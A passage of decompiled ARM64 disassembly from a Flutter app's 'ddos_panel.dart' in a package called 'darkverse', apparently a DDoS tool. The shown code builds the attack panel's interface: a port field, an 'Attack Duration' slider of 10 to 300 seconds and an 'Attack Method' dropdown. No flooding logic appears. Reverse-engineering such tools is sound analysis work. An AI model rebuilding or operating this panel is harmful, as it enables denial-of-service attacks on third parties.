    //     0x804d10: stur            w0, [x1, #0x27]
    // 0x804d14: d0 = 1.000000
    //     0x804d14: fmov            d0, #1.00000000
    // 0x804d18: StoreField: r1->field_7 = d0
    //     0x804d18: stur            d0, [x1, #7]
    // 0x804d1c: d0 = 0.882353
    //     0x804d1c: add             x17, PP, #0x14, lsl #12  ; [pp+0x14468] IMM: double(0.8823529411764706) from 0x3fec3c3c3c3c3c3c
    //     0x804d20: ldr             d0, [x17, #0x468]
    // 0x804d24: StoreField: r1->field_f = d0
    //     0x804d24: stur            d0, [x1, #0xf]
    // 0x804d28: d0 = 0.501961
    //     0x804d28: add             x17, PP, #0x14, lsl #12  ; [pp+0x14470] IMM: double(0.5019607843137255) from 0x3fe0101010101010
    //     0x804d2c: ldr             d0, [x17, #0x470]
    // 0x804d30: ArrayStore: r1[0] = d0  ; List_8
    //     0x804d30: stur            d0, [x1, #0x17]
    // 0x804d34: d0 = 0.490196
    //     0x804d34: add             x17, PP, #0x14, lsl #12  ; [pp+0x14478] IMM: double(0.49019607843137253) from 0x3fdf5f5f5f5f5f5f
    //     0x804d38: ldr             d0, [x17, #0x478]
    // 0x804d3c: StoreField: r1->field_1f = d0
    //     0x804d3c: stur            d0, [x1, #0x1f]
    // 0x804d40: mov             x3, x1
    // 0x804d44: b               #0x804d50
    // 0x804d48: r3 = Instance_Color
    //     0x804d48: add             x3, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x804d4c: ldr             x3, [x3, #0xf80]
    // 0x804d50: ldur            x0, [fp, #-0x10]
    // 0x804d54: stur            x3, [fp, #-0x48]
    // 0x804d58: tbnz            w0, #4, #0x804d68
    // 0x804d5c: r2 = "ICMP does not use port"
    //     0x804d5c: add             x2, PP, #0x40, lsl #12  ; [pp+0x40f10] "ICMP does not use port"
    //     0x804d60: ldr             x2, [x2, #0xf10]
    // 0x804d64: b               #0x804d70
    // 0x804d68: r2 = "Port (e.g. 80)"
    //     0x804d68: add             x2, PP, #0x40, lsl #12  ; [pp+0x40f18] "Port (e.g. 80)"
    //     0x804d6c: ldr             x2, [x2, #0xf18]
    // 0x804d70: ldur            x6, [fp, #-8]
    // 0x804d74: ldur            x10, [fp, #-0x20]
    // 0x804d78: ldur            x5, [fp, #-0x38]
    // 0x804d7c: ldur            x9, [fp, #-0x28]
    // 0x804d80: ldur            x7, [fp, #-0x40]
    // 0x804d84: ldur            x8, [fp, #-0x30]
    // 0x804d88: ldur            x4, [fp, #-0x50]
    // 0x804d8c: str             x0, [SP]
    // 0x804d90: mov             x1, x6
    // 0x804d94: r4 = const [0, 0x3, 0x1, 0x2, isIcmp, 0x2, null]
    //     0x804d94: add             x4, PP, #0x40, lsl #12  ; [pp+0x40f20] List(7) [0, 0x3, 0x1, 0x2, "isIcmp", 0x2, Null]
    //     0x804d98: ldr             x4, [x4, #0xf20]
    // 0x804d9c: r0 = _inputStyle()
    //     0x804d9c: bl              #0x805cc4  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_inputStyle
    // 0x804da0: stur            x0, [fp, #-0x10]
    // 0x804da4: r0 = TextField()
    //     0x804da4: bl              #0x6dd5b4  ; AllocateTextFieldStub -> TextField (size=0x128)
    // 0x804da8: mov             x1, x0
    // 0x804dac: r0 = EditableText
    //     0x804dac: ldr             x0, [PP, #0x50a0]  ; [pp+0x50a0] Type: EditableText
    // 0x804db0: StoreField: r1->field_f = r0
    //     0x804db0: stur            w0, [x1, #0xf]
    // 0x804db4: ldur            x0, [fp, #-0x40]
    // 0x804db8: StoreField: r1->field_13 = r0
    //     0x804db8: stur            w0, [x1, #0x13]
    // 0x804dbc: ldur            x0, [fp, #-0x10]
    // 0x804dc0: StoreField: r1->field_1b = r0
    //     0x804dc0: stur            w0, [x1, #0x1b]
    // 0x804dc4: r0 = Instance_TextCapitalization
    //     0x804dc4: add             x0, PP, #0x14, lsl #12  ; [pp+0x149e0] Obj!TextCapitalization@a3f5e1
    //     0x804dc8: ldr             x0, [x0, #0x9e0]
    // 0x804dcc: StoreField: r1->field_27 = r0
    //     0x804dcc: stur            w0, [x1, #0x27]
    // 0x804dd0: ldur            x0, [fp, #-0x50]
    // 0x804dd4: StoreField: r1->field_2b = r0
    //     0x804dd4: stur            w0, [x1, #0x2b]
    // 0x804dd8: r0 = Instance_TextAlign
    //     0x804dd8: ldr             x0, [PP, #0x4960]  ; [pp+0x4960] Obj!TextAlign@a43321
    // 0x804ddc: StoreField: r1->field_33 = r0
    //     0x804ddc: stur            w0, [x1, #0x33]
    // 0x804de0: r0 = false
    //     0x804de0: add             x0, NULL, #0x30  ; false
    // 0x804de4: StoreField: r1->field_6b = r0
    //     0x804de4: stur            w0, [x1, #0x6b]
    // 0x804de8: StoreField: r1->field_3f = r0
    //     0x804de8: stur            w0, [x1, #0x3f]
    // 0x804dec: r2 = "•"
    //     0x804dec: add             x2, PP, #0x14, lsl #12  ; [pp+0x149e8] "•"
    //     0x804df0: ldr             x2, [x2, #0x9e8]
    // 0x804df4: StoreField: r1->field_47 = r2
    //     0x804df4: stur            w2, [x1, #0x47]
    // 0x804df8: StoreField: r1->field_4b = r0
    //     0x804df8: stur            w0, [x1, #0x4b]
    // 0x804dfc: r4 = true
    //     0x804dfc: add             x4, NULL, #0x20  ; true
    // 0x804e00: StoreField: r1->field_5b = r4
    //     0x804e00: stur            w4, [x1, #0x5b]
    // 0x804e04: r2 = 2
    //     0x804e04: mov             x2, #2
    // 0x804e08: StoreField: r1->field_5f = r2
    //     0x804e08: stur            w2, [x1, #0x5f]
    // 0x804e0c: StoreField: r1->field_67 = r0
    //     0x804e0c: stur            w0, [x1, #0x67]
    // 0x804e10: ldur            x2, [fp, #-0x30]
    // 0x804e14: StoreField: r1->field_93 = r2
    //     0x804e14: stur            w2, [x1, #0x93]
    // 0x804e18: d0 = 2.000000
    //     0x804e18: fmov            d0, #2.00000000
    // 0x804e1c: StoreField: r1->field_9b = d0
    //     0x804e1c: stur            d0, [x1, #0x9b]
    // 0x804e20: ldur            x2, [fp, #-0x48]
    // 0x804e24: StoreField: r1->field_af = r2
    //     0x804e24: stur            w2, [x1, #0xaf]
    // 0x804e28: r6 = Instance_EdgeInsets
    //     0x804e28: ldr             x6, [PP, #0x5348]  ; [pp+0x5348] Obj!EdgeInsets@a05fc1
    // 0x804e2c: StoreField: r1->field_c3 = r6
    //     0x804e2c: stur            w6, [x1, #0xc3]
    // 0x804e30: r7 = Instance_DragStartBehavior
    //     0x804e30: ldr             x7, [PP, #0x5090]  ; [pp+0x5090] Obj!DragStartBehavior@a418a1
    // 0x804e34: StoreField: r1->field_d3 = r7
    //     0x804e34: stur            w7, [x1, #0xd3]
    // 0x804e38: StoreField: r1->field_db = r0
    //     0x804e38: stur            w0, [x1, #0xdb]
    // 0x804e3c: r2 = const []
    //     0x804e3c: ldr             x2, [PP, #0x5e68]  ; [pp+0x5e68] List<String>(0)
    // 0x804e40: StoreField: r1->field_f7 = r2
    //     0x804e40: stur            w2, [x1, #0xf7]
    // 0x804e44: r8 = Instance_Clip
    //     0x804e44: add             x8, PP, #0xc, lsl #12  ; [pp+0xca18] Obj!Clip@a43d61
    //     0x804e48: ldr             x8, [x8, #0xa18]
    // 0x804e4c: StoreField: r1->field_fb = r8
    //     0x804e4c: stur            w8, [x1, #0xfb]
    // 0x804e50: r17 = 259
    //     0x804e50: mov             x17, #0x103
    // 0x804e54: str             w4, [x1, x17]
    // 0x804e58: r17 = 263
    //     0x804e58: mov             x17, #0x107
    // 0x804e5c: str             w4, [x1, x17]
    // 0x804e60: r17 = 267
    //     0x804e60: mov             x17, #0x10b
    // 0x804e64: str             w4, [x1, x17]
    // 0x804e68: r2 = Closure: (BuildContext, EditableTextState) => Widget from Function '_defaultContextMenuBuilder@127181401': static.
    //     0x804e68: add             x2, PP, #0x14, lsl #12  ; [pp+0x149f8] Closure: (BuildContext, EditableTextState) => Widget from Function '_defaultContextMenuBuilder@127181401': static. (0x75b33a6e60)
    //     0x804e6c: ldr             x2, [x2, #0x9f8]
    // 0x804e70: r17 = 275
    //     0x804e70: mov             x17, #0x113
    // 0x804e74: str             w2, [x1, x17]
    // 0x804e78: r17 = 279
    //     0x804e78: mov             x17, #0x117
    // 0x804e7c: str             w4, [x1, x17]
    // 0x804e80: r2 = Instance_SmartDashesType
    //     0x804e80: add             x2, PP, #0x14, lsl #12  ; [pp+0x14a00] Obj!SmartDashesType@a3f821
    //     0x804e84: ldr             x2, [x2, #0xa00]
    // 0x804e88: StoreField: r1->field_53 = r2
    //     0x804e88: stur            w2, [x1, #0x53]
    // 0x804e8c: r2 = Instance_SmartQuotesType
    //     0x804e8c: add             x2, PP, #0x14, lsl #12  ; [pp+0x14a08] Obj!SmartQuotesType@a3f7e1
    //     0x804e90: ldr             x2, [x2, #0xa08]
    // 0x804e94: StoreField: r1->field_57 = r2
    //     0x804e94: stur            w2, [x1, #0x57]
    // 0x804e98: r2 = Instance_TextInputType
    //     0x804e98: add             x2, PP, #0x11, lsl #12  ; [pp+0x11710] Obj!TextInputType@a04531
    //     0x804e9c: ldr             x2, [x2, #0x710]
    // 0x804ea0: StoreField: r1->field_1f = r2
    //     0x804ea0: stur            w2, [x1, #0x1f]
    // 0x804ea4: StoreField: r1->field_c7 = r4
    //     0x804ea4: stur            w4, [x1, #0xc7]
    // 0x804ea8: mov             x2, x1
    // 0x804eac: ldur            x1, [fp, #-8]
    // 0x804eb0: r3 = Instance_IconData
    //     0x804eb0: add             x3, PP, #0x40, lsl #12  ; [pp+0x40f28] Obj!IconData@a02381
    //     0x804eb4: ldr             x3, [x3, #0xf28]
    // 0x804eb8: r5 = "Port"
    //     0x804eb8: add             x5, PP, #0x3f, lsl #12  ; [pp+0x3f598] "Port"
    //     0x804ebc: ldr             x5, [x5, #0x598]
    // 0x804ec0: r0 = _buildInputCard()
    //     0x804ec0: bl              #0x805970  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_buildInputCard
    // 0x804ec4: ldur            x1, [fp, #-0x38]
    // 0x804ec8: ArrayStore: r1[7] = r0  ; List_4
    //     0x804ec8: add             x25, x1, #0x2b
    //     0x804ecc: str             w0, [x25]
    //     0x804ed0: tbz             w0, #0, #0x804eec
    //     0x804ed4: ldurb           w16, [x1, #-1]
    //     0x804ed8: ldurb           w17, [x0, #-1]
    //     0x804edc: and             x16, x17, x16, lsr #2
    //     0x804ee0: tst             x16, HEAP, lsr #32
    //     0x804ee4: b.eq            #0x804eec
    //     0x804ee8: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x804eec: ldur            x0, [fp, #-0x38]
    // 0x804ef0: r16 = Instance_SizedBox
    //     0x804ef0: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x804ef4: ldr             x16, [x16, #0x5b0]
    // 0x804ef8: StoreField: r0->field_2f = r16
    //     0x804ef8: stur            w16, [x0, #0x2f]
    // 0x804efc: r1 = Null
    //     0x804efc: mov             x1, NULL
    // 0x804f00: r2 = 6
    //     0x804f00: mov             x2, #6
    // 0x804f04: r0 = AllocateArray()
    //     0x804f04: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x804f08: r16 = "⏱ "
    //     0x804f08: add             x16, PP, #0x40, lsl #12  ; [pp+0x40f30] "⏱ "
    //     0x804f0c: ldr             x16, [x16, #0xf30]
    // 0x804f10: StoreField: r0->field_f = r16
    //     0x804f10: stur            w16, [x0, #0xf]
    // 0x804f14: ldur            x1, [fp, #-8]
    // 0x804f18: LoadField: d0 = r1->field_2f
    //     0x804f18: ldur            d0, [x1, #0x2f]
    // 0x804f1c: fcmp            d0, d0
    // 0x804f20: b.vs            #0x8055cc
    // 0x804f24: fcvtzs          x2, d0
    // 0x804f28: asr             x16, x2, #0x1e
    // 0x804f2c: cmp             x16, x2, asr #63
    // 0x804f30: b.ne            #0x8055cc
    // 0x804f34: lsl             x2, x2, #1
    // 0x804f38: StoreField: r0->field_13 = r2
    //     0x804f38: stur            w2, [x0, #0x13]
    // 0x804f3c: r16 = " seconds"
    //     0x804f3c: add             x16, PP, #0x40, lsl #12  ; [pp+0x40f38] " seconds"
    //     0x804f40: ldr             x16, [x16, #0xf38]
    // 0x804f44: ArrayStore: r0[0] = r16  ; List_4
    //     0x804f44: stur            w16, [x0, #0x17]
    // 0x804f48: str             x0, [SP]
    // 0x804f4c: r0 = _interpolate()
    //     0x804f4c: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x804f50: ldur            x1, [fp, #-0x28]
    // 0x804f54: d0 = 0.700000
    //     0x804f54: add             x17, PP, #0x12, lsl #12  ; [pp+0x12098] IMM: double(0.7) from 0x3fe6666666666666
    //     0x804f58: ldr             d0, [x17, #0x98]
    // 0x804f5c: stur            x0, [fp, #-0x10]
    // 0x804f60: r0 = withOpacity()
    //     0x804f60: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x804f64: stur            x0, [fp, #-0x30]
    // 0x804f68: r0 = TextStyle()
    //     0x804f68: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x804f6c: mov             x1, x0
    // 0x804f70: r0 = true
    //     0x804f70: add             x0, NULL, #0x20  ; true
    // 0x804f74: stur            x1, [fp, #-0x40]
    // 0x804f78: StoreField: r1->field_7 = r0
    //     0x804f78: stur            w0, [x1, #7]
    // 0x804f7c: ldur            x2, [fp, #-0x30]
    // 0x804f80: StoreField: r1->field_b = r2
    //     0x804f80: stur            w2, [x1, #0xb]
    // 0x804f84: r2 = 14.000000
    //     0x804f84: add             x2, PP, #0xb, lsl #12  ; [pp+0xbb28] 14
    //     0x804f88: ldr             x2, [x2, #0xb28]
    // 0x804f8c: StoreField: r1->field_1f = r2
    //     0x804f8c: stur            w2, [x1, #0x1f]
    // 0x804f90: r0 = Text()
    //     0x804f90: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x804f94: mov             x3, x0
    // 0x804f98: ldur            x0, [fp, #-0x10]
    // 0x804f9c: stur            x3, [fp, #-0x30]
    // 0x804fa0: StoreField: r3->field_b = r0
    //     0x804fa0: stur            w0, [x3, #0xb]
    // 0x804fa4: ldur            x0, [fp, #-0x40]
    // 0x804fa8: StoreField: r3->field_13 = r0
    //     0x804fa8: stur            w0, [x3, #0x13]
    // 0x804fac: ldur            x0, [fp, #-8]
    // 0x804fb0: LoadField: d0 = r0->field_2f
    //     0x804fb0: ldur            d0, [x0, #0x2f]
    // 0x804fb4: stur            d0, [fp, #-0x58]
    // 0x804fb8: fcmp            d0, d0
    // 0x804fbc: b.vs            #0x8055f4
    // 0x804fc0: fcvtzs          x4, d0
    // 0x804fc4: asr             x16, x4, #0x1e
    // 0x804fc8: cmp             x16, x4, asr #63
    // 0x804fcc: b.ne            #0x8055f4
    // 0x804fd0: lsl             x4, x4, #1
    // 0x804fd4: stur            x4, [fp, #-0x10]
    // 0x804fd8: r1 = Null
    //     0x804fd8: mov             x1, NULL
    // 0x804fdc: r2 = 4
    //     0x804fdc: mov             x2, #4
    // 0x804fe0: r0 = AllocateArray()
    //     0x804fe0: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x804fe4: mov             x1, x0
    // 0x804fe8: ldur            x0, [fp, #-0x10]
    // 0x804fec: StoreField: r1->field_f = r0
    //     0x804fec: stur            w0, [x1, #0xf]
    // 0x804ff0: r16 = "s"
    //     0x804ff0: ldr             x16, [PP, #0x60b8]  ; [pp+0x60b8] "s"
    // 0x804ff4: StoreField: r1->field_13 = r16
    //     0x804ff4: stur            w16, [x1, #0x13]
    // 0x804ff8: str             x1, [SP]
    // 0x804ffc: r0 = _interpolate()
    //     0x804ffc: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x805000: ldur            x1, [fp, #-0x28]
    // 0x805004: d0 = 0.100000
    //     0x805004: add             x17, PP, #0xc, lsl #12  ; [pp+0xc100] IMM: double(0.1) from 0x3fb999999999999a
    //     0x805008: ldr             d0, [x17, #0x100]
    // 0x80500c: stur            x0, [fp, #-0x10]
    // 0x805010: r0 = withOpacity()
    //     0x805010: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x805014: stur            x0, [fp, #-0x40]
    // 0x805018: r0 = Slider()
    //     0x805018: bl              #0x7c4954  ; AllocateSliderStub -> Slider (size=0x78)
    // 0x80501c: ldur            d0, [fp, #-0x58]
    // 0x805020: stur            x0, [fp, #-0x48]
    // 0x805024: StoreField: r0->field_b = d0
    //     0x805024: stur            d0, [x0, #0xb]
    // 0x805028: ldur            x2, [fp, #-0x18]
    // 0x80502c: r1 = Function '<anonymous closure>':.
    //     0x80502c: add             x1, PP, #0x40, lsl #12  ; [pp+0x40f40] AnonymousClosure: (0x806a20), in [package:darkverse/ddos_panel.dart] _AttackPanelState::build (0x804818)
    //     0x805030: ldr             x1, [x1, #0xf40]
    // 0x805034: r0 = AllocateClosure()
    //     0x805034: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x805038: mov             x1, x0
    // 0x80503c: ldur            x0, [fp, #-0x48]
    // 0x805040: ArrayStore: r0[0] = r1  ; List_4
    //     0x805040: stur            w1, [x0, #0x17]
    // 0x805044: d0 = 10.000000
    //     0x805044: fmov            d0, #10.00000000
    // 0x805048: StoreField: r0->field_23 = d0
    //     0x805048: stur            d0, [x0, #0x23]
    // 0x80504c: d0 = 300.000000
    //     0x80504c: add             x17, PP, #0xd, lsl #12  ; [pp+0xda28] IMM: double(300) from 0x4072c00000000000
    //     0x805050: ldr             d0, [x17, #0xa28]
    // 0x805054: StoreField: r0->field_2b = d0
    //     0x805054: stur            d0, [x0, #0x2b]
    // 0x805058: r1 = 29
    //     0x805058: mov             x1, #0x1d
    // 0x80505c: StoreField: r0->field_33 = r1
    //     0x80505c: stur            x1, [x0, #0x33]
    // 0x805060: ldur            x1, [fp, #-0x10]
    // 0x805064: StoreField: r0->field_3b = r1
    //     0x805064: stur            w1, [x0, #0x3b]
    // 0x805068: r3 = Instance_Color
    //     0x805068: add             x3, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x80506c: ldr             x3, [x3, #0xf80]
    // 0x805070: StoreField: r0->field_3f = r3
    //     0x805070: stur            w3, [x0, #0x3f]
    // 0x805074: ldur            x1, [fp, #-0x40]
    // 0x805078: StoreField: r0->field_43 = r1
    //     0x805078: stur            w1, [x0, #0x43]
    // 0x80507c: r4 = false
    //     0x80507c: add             x4, NULL, #0x30  ; false
    // 0x805080: StoreField: r0->field_5f = r4
    //     0x805080: stur            w4, [x0, #0x5f]
    // 0x805084: r1 = Instance__SliderType
    //     0x805084: add             x1, PP, #0x26, lsl #12  ; [pp+0x263d8] Obj!_SliderType@a40d61
    //     0x805088: ldr             x1, [x1, #0x3d8]
    // 0x80508c: StoreField: r0->field_73 = r1
    //     0x80508c: stur            w1, [x0, #0x73]
    // 0x805090: r1 = Null
    //     0x805090: mov             x1, NULL
    // 0x805094: r2 = 4
    //     0x805094: mov             x2, #4
    // 0x805098: r0 = AllocateArray()
    //     0x805098: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x80509c: mov             x2, x0
    // 0x8050a0: ldur            x0, [fp, #-0x30]
    // 0x8050a4: stur            x2, [fp, #-0x10]
    // 0x8050a8: StoreField: r2->field_f = r0
    //     0x8050a8: stur            w0, [x2, #0xf]
    // 0x8050ac: ldur            x0, [fp, #-0x48]
    // 0x8050b0: StoreField: r2->field_13 = r0
    //     0x8050b0: stur            w0, [x2, #0x13]
    // 0x8050b4: r1 = <Widget>
    //     0x8050b4: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x8050b8: r0 = AllocateGrowableArray()
    //     0x8050b8: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x8050bc: mov             x1, x0
    // 0x8050c0: ldur            x0, [fp, #-0x10]
    // 0x8050c4: stur            x1, [fp, #-0x30]
    // 0x8050c8: StoreField: r1->field_f = r0
    //     0x8050c8: stur            w0, [x1, #0xf]
    // 0x8050cc: r0 = 4
    //     0x8050cc: mov             x0, #4
    // 0x8050d0: StoreField: r1->field_b = r0
    //     0x8050d0: stur            w0, [x1, #0xb]
    // 0x8050d4: r0 = Column()
    //     0x8050d4: bl              #0x641538  ; AllocateColumnStub -> Column (size=0x38)
    // 0x8050d8: mov             x1, x0
    // 0x8050dc: r0 = Instance_Axis
    //     0x8050dc: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x8050e0: StoreField: r1->field_f = r0
    //     0x8050e0: stur            w0, [x1, #0xf]
    // 0x8050e4: r4 = Instance_MainAxisAlignment
    //     0x8050e4: ldr             x4, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x8050e8: StoreField: r1->field_13 = r4
    //     0x8050e8: stur            w4, [x1, #0x13]
    // 0x8050ec: r6 = Instance_MainAxisSize
    //     0x8050ec: add             x6, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x8050f0: ldr             x6, [x6, #0xbc0]
    // 0x8050f4: ArrayStore: r1[0] = r6  ; List_4
    //     0x8050f4: stur            w6, [x1, #0x17]
    // 0x8050f8: r2 = Instance_CrossAxisAlignment
    //     0x8050f8: add             x2, PP, #0xa, lsl #12  ; [pp+0xada0] Obj!CrossAxisAlignment@a402e1
    //     0x8050fc: ldr             x2, [x2, #0xda0]
    // 0x805100: StoreField: r1->field_1b = r2
    //     0x805100: stur            w2, [x1, #0x1b]
    // 0x805104: r7 = Instance_VerticalDirection
    //     0x805104: ldr             x7, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x805108: StoreField: r1->field_23 = r7
    //     0x805108: stur            w7, [x1, #0x23]
    // 0x80510c: r8 = Instance_Clip
    //     0x80510c: ldr             x8, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x805110: StoreField: r1->field_2b = r8
    //     0x805110: stur            w8, [x1, #0x2b]
    // 0x805114: StoreField: r1->field_2f = rZR
    //     0x805114: stur            xzr, [x1, #0x2f]
    // 0x805118: ldur            x2, [fp, #-0x30]
    // 0x80511c: StoreField: r1->field_b = r2
    //     0x80511c: stur            w2, [x1, #0xb]
    // 0x805120: mov             x2, x1
    // 0x805124: ldur            x1, [fp, #-8]
    // 0x805128: r3 = Instance_IconData
    //     0x805128: add             x3, PP, #0x38, lsl #12  ; [pp+0x38cf0] Obj!IconData@a023c1
    //     0x80512c: ldr             x3, [x3, #0xcf0]
    // 0x805130: r5 = "Attack Duration"
    //     0x805130: add             x5, PP, #0x40, lsl #12  ; [pp+0x40f48] "Attack Duration"
    //     0x805134: ldr             x5, [x5, #0xf48]
    // 0x805138: r0 = _buildInputCard()
    //     0x805138: bl              #0x805970  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_buildInputCard
    // 0x80513c: ldur            x1, [fp, #-0x38]
    // 0x805140: ArrayStore: r1[9] = r0  ; List_4
    //     0x805140: add             x25, x1, #0x33
    //     0x805144: str             w0, [x25]
    //     0x805148: tbz             w0, #0, #0x805164
    //     0x80514c: ldurb           w16, [x1, #-1]
    //     0x805150: ldurb           w17, [x0, #-1]
    //     0x805154: and             x16, x17, x16, lsr #2
    //     0x805158: tst             x16, HEAP, lsr #32
    //     0x80515c: b.eq            #0x805164
    //     0x805160: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x805164: ldur            x1, [fp, #-0x38]
    // 0x805168: r16 = Instance_SizedBox
    //     0x805168: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x80516c: ldr             x16, [x16, #0x5b0]
    // 0x805170: StoreField: r1->field_37 = r16
    //     0x805170: stur            w16, [x1, #0x37]
    // 0x805174: ldur            x0, [fp, #-8]
    // 0x805178: LoadField: r6 = r0->field_2b
    //     0x805178: ldur            w6, [x0, #0x2b]
    // 0x80517c: DecompressPointer r6
    //     0x80517c: add             x6, x6, HEAP, lsl #32
    // 0x805180: stur            x6, [fp, #-0x10]
    // 0x805184: r0 = TextStyle()
    //     0x805184: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x805188: mov             x3, x0
    // 0x80518c: r0 = true
    //     0x80518c: add             x0, NULL, #0x20  ; true
    // 0x805190: stur            x3, [fp, #-0x40]
    // 0x805194: StoreField: r3->field_7 = r0
    //     0x805194: stur            w0, [x3, #7]
    // 0x805198: ldur            x4, [fp, #-0x28]
    // 0x80519c: StoreField: r3->field_b = r4
    //     0x80519c: stur            w4, [x3, #0xb]
    // 0x8051a0: ldur            x5, [fp, #-8]
    // 0x8051a4: LoadField: r1 = r5->field_b
    //     0x8051a4: ldur            w1, [x5, #0xb]
    // 0x8051a8: DecompressPointer r1
    //     0x8051a8: add             x1, x1, HEAP, lsl #32
    // 0x8051ac: cmp             w1, NULL
    // 0x8051b0: b.eq            #0x80561c
    // 0x8051b4: LoadField: r6 = r1->field_f
    //     0x8051b4: ldur            w6, [x1, #0xf]
    // 0x8051b8: DecompressPointer r6
    //     0x8051b8: add             x6, x6, HEAP, lsl #32
    // 0x8051bc: ldur            x2, [fp, #-0x18]
    // 0x8051c0: stur            x6, [fp, #-0x30]
    // 0x8051c4: r1 = Function '<anonymous closure>':.
    //     0x8051c4: add             x1, PP, #0x40, lsl #12  ; [pp+0x40f50] AnonymousClosure: (0x8068a0), in [package:darkverse/ddos_panel.dart] _AttackPanelState::build (0x804818)
    //     0x8051c8: ldr             x1, [x1, #0xf50]
    // 0x8051cc: r0 = AllocateClosure()
    //     0x8051cc: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x8051d0: r16 = <DropdownMenuItem<String>>
    //     0x8051d0: add             x16, PP, #0x18, lsl #12  ; [pp+0x18858] TypeArguments: <DropdownMenuItem<String>>
    //     0x8051d4: ldr             x16, [x16, #0x858]
    // 0x8051d8: ldur            lr, [fp, #-0x30]
    // 0x8051dc: stp             lr, x16, [SP, #8]
    // 0x8051e0: str             x0, [SP]
    // 0x8051e4: r4 = const [0x1, 0x2, 0x2, 0x2, null]
    //     0x8051e4: ldr             x4, [PP, #0x40]  ; [pp+0x40] List(5) [0x1, 0x2, 0x2, 0x2, Null]
    // 0x8051e8: r0 = map()
    //     0x8051e8: bl              #0x596cf4  ; [dart:collection] ListBase::map
    // 0x8051ec: LoadField: r1 = r0->field_7
    //     0x8051ec: ldur            w1, [x0, #7]
    // 0x8051f0: DecompressPointer r1
    //     0x8051f0: add             x1, x1, HEAP, lsl #32
    // 0x8051f4: mov             x2, x0
    // 0x8051f8: r0 = _GrowableList.of()
    //     0x8051f8: bl              #0x45da20  ; [dart:core] _GrowableList::_GrowableList.of
    // 0x8051fc: ldur            x2, [fp, #-0x18]
    // 0x805200: r1 = Function '<anonymous closure>':.
    //     0x805200: add             x1, PP, #0x40, lsl #12  ; [pp+0x40f58] AnonymousClosure: (0x8067b8), in [package:darkverse/ddos_panel.dart] _AttackPanelState::build (0x804818)
    //     0x805204: ldr             x1, [x1, #0xf58]
    // 0x805208: stur            x0, [fp, #-0x18]
    // 0x80520c: r0 = AllocateClosure()
    //     0x80520c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x805210: r1 = <String>
    //     0x805210: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x805214: stur            x0, [fp, #-0x30]
    // 0x805218: r0 = DropdownButton()
    //     0x805218: bl              #0x805964  ; AllocateDropdownButtonStub -> DropdownButton<X0> (size=0x98)
    // 0x80521c: stur            x0, [fp, #-0x48]
    // 0x805220: r16 = Instance_Color
    //     0x805220: add             x16, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x805224: ldr             x16, [x16, #0xf80]
    // 0x805228: ldur            lr, [fp, #-0x40]
    // 0x80522c: stp             lr, x16, [SP]
    // 0x805230: mov             x1, x0
    // 0x805234: ldur            x3, [fp, #-0x18]
    // 0x805238: ldur            x5, [fp, #-0x30]
    // 0x80523c: ldur            x6, [fp, #-0x10]
    // 0x805240: r2 = Instance_Color
    //     0x805240: add             x2, PP, #0x32, lsl #12  ; [pp+0x32fa0] Obj!Color@a11491
    //     0x805244: ldr             x2, [x2, #0xfa0]
    // 0x805248: r4 = const [0, 0x7, 0x2, 0x5, iconEnabledColor, 0x5, style, 0x6, null]
    //     0x805248: add             x4, PP, #0x40, lsl #12  ; [pp+0x40f60] List(9) [0, 0x7, 0x2, 0x5, "iconEnabledColor", 0x5, "style", 0x6, Null]
    //     0x80524c: ldr             x4, [x4, #0xf60]
    // 0x805250: r0 = DropdownButton()
    //     0x805250: bl              #0x80562c  ; [package:flutter/src/material/dropdown.dart] DropdownButton::DropdownButton
    // 0x805254: r0 = DropdownButtonHideUnderline()
    //     0x805254: bl              #0x805620  ; AllocateDropdownButtonHideUnderlineStub -> DropdownButtonHideUnderline (size=0x10)
    // 0x805258: mov             x1, x0
    // 0x80525c: ldur            x0, [fp, #-0x48]
    // 0x805260: StoreField: r1->field_b = r0
    //     0x805260: stur            w0, [x1, #0xb]
    // 0x805264: mov             x2, x1
    // 0x805268: ldur            x1, [fp, #-8]
    // 0x80526c: r3 = Instance_IconData
    //     0x80526c: add             x3, PP, #0x28, lsl #12  ; [pp+0x28a88] Obj!IconData@a01761
    //     0x805270: ldr             x3, [x3, #0xa88]
    // 0x805274: r5 = "Attack Method"
    //     0x805274: add             x5, PP, #0x40, lsl #12  ; [pp+0x40f68] "Attack Method"
    //     0x805278: ldr             x5, [x5, #0xf68]
    // 0x80527c: r0 = _buildInputCard()
